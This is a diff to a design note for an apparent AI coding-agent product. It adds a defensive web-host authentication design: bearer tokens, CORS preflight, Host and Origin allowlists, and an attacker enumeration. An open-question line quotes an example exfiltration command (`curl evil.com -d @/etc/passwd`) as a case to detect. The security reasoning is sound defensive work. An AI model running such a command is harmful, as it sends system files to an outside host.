@@ -12,6 +12,7 @@ informs:
     "[[protocol-design]]",
     "[[consensus-model]]",
     "[[multi-device-ux]]",
+    "[[tool-system]]",
   ]
 ---
 
@@ -120,3 +121,31 @@ The mesh needs a **dataless control plane** — self-hosted **Headscale + DERP**
 - Network exfiltration detection: how to distinguish `curl localhost:3000` from `curl evil.com -d @/etc/passwd`?
 - How do profiles compose with per-command overrides? Can users allowlist specific commands that would otherwise be blocked?
 - **Session portability (updated 2026-06-30, supersedes the 2026-04-25 "sessions stay on home device" stance):** sessions ARE replicated and resumable from anywhere. The engine runs on the elected leader, not a fixed home device; tool calls target a _daemon_ (the active device or an explicitly-named one), and risk is evaluated against that daemon's profile. Path resolution happens at the tool boundary against the target device's filesystem. See [[consensus-model]], [[multi-device-ux]].
+
+## Web host auth — `kuib web` + code.kuib.ai (2026-07-01)
+
+The web host (`kuib web`, see [[host-layer]]) exposes the engine over HTTP so a browser — a local same-origin page, or the hosted frontend at `https://code.kuib.ai` — can drive it. Because a submit runs the agent loop (i.e. can `rm -rf`), **this is the highest-risk boundary in the product** and the auth model was reasoned from an explicit attacker enumeration.
+
+**Core rule: CORS is NOT an authorization boundary.** CORS only governs whether a cross-origin caller may _read_ the response; it does not stop the request from being _sent or processed_. So the destructive action fires regardless. Auth must be positive.
+
+**Decision: header bearer token, not cookies.**
+
+- A per-run, in-memory, high-entropy token gates every non-static request (`Authorization: Bearer …`; SSE carries it as a `?token=` query param because `EventSource` can't set headers).
+- **Why not HttpOnly cookies** (the tempting alternative): cookies are auto-attached by the browser, which is exactly the CSRF vector. And because code.kuib.ai↔localhost is inherently _cross-site_, the cookie would need `SameSite=None` — which re-permits every attacker origin too, so `SameSite` buys no protection here. A custom `Authorization` header instead makes every request "non-simple" → forces a CORS **preflight** we deny for non-allowlisted origins → the attacker's request never fires. XSS-read risk on the token is contained (single trusted origin) and strictly less bad than cookie CSRF on an `rm -rf` endpoint.
+- **No localhost TLS for v1.** The only strong pressure for it was `SameSite=None; Secure`; dropping cookies drops that. `http://localhost` is already a secure-context, loopback traffic can't be remotely sniffed, and the mesh hop is WireGuard-encrypted anyway. The public-CA-cert-for-`127.0.0.1` trick (Plex `*.plex.direct`) is real but costs per-user cert issuance or a shared-key MITM risk — not worth it while we avoid cookies.
+
+**Defence-in-depth layers (on top of the token):**
+
+- **Bind loopback + this node's tailscale IP only** — never `0.0.0.0` (the LAN interface is never exposed). Tailnet bind is deliberate so phone / other mesh nodes can reach it; the tailnet is WireGuard-authenticated and trusted.
+- **`Host` header allowlist** (`localhost`/`127.0.0.1`/our tailscale IP/`*.ts.net`) — defeats **DNS-rebinding** (a malicious site repointing its DNS at us to masquerade as same-origin).
+- **Origin allowlist, no reflection** — only loopback origins, our tailnet identity, and `https://code.kuib.ai`; every other Origin → 403.
+- **Private Network Access preflight** — public site → loopback needs `Access-Control-Allow-Private-Network: true` or Chrome blocks it.
+- **`Content-Type: application/json` enforced on submit** — closes the `text/plain` "simple request" CSRF bypass (text/plain avoids preflight).
+- **Pairing handshake for the hosted origin** — `kuib web` prints a high-entropy, single-use, 5-min, rate-limited (≤5 attempts) code; code.kuib.ai exchanges it at `/pair` for the token. **The hosted site stays dataless** — it serves JS, never holds engine data or keys. A same-origin dev token endpoint (`/api/token`) exists **only** under `KUIB_WEB_DEV` and **never** answers the hosted origin (which must pair).
+- **Remote-origin submit = elevated risk tier** — a command arriving from code.kuib.ai should face a firmer confirmation than one typed into the local TUI. Folds into the `risk = commandRisk × deviceProfile` model above (transport becomes a risk input).
+
+**Attacker enumeration / residual risk (stress-test):**
+
+- _DNS rebinding_ → Host-check. _CSRF via simple POST_ → forced preflight (header token) + JSON content-type. _Cross-origin SSE read_ → blocked (no ACAO for evil.com). _Token in SSE URL_ → localhost-only, per-run, ephemeral; acceptable, tighten to a per-connection stream ticket later. _Same-user local process_ → **not a new boundary** (same-user already = full trust; daemon is user-scoped). _Port guessing_ → token is the real gate, not obscurity. _Reflected-Origin misconfig_ → strict allowlist, never echo arbitrary Origin. _WebSocket (if ever added)_ → note: WS does **not** enforce CORS, so it would need in-band token + explicit Origin check. _Pairing brute-force_ → entropy + TTL + single-use + rate-limit. _Token at rest_ → memory only, regenerated per run, never written world-readable.
+
+Verified (2026-07-01): unauth→401, bad Host→421, disallowed Origin→403, `text/plain` submit→415, authed submit→202 streaming. See [[host-layer]] for the transport/read side.
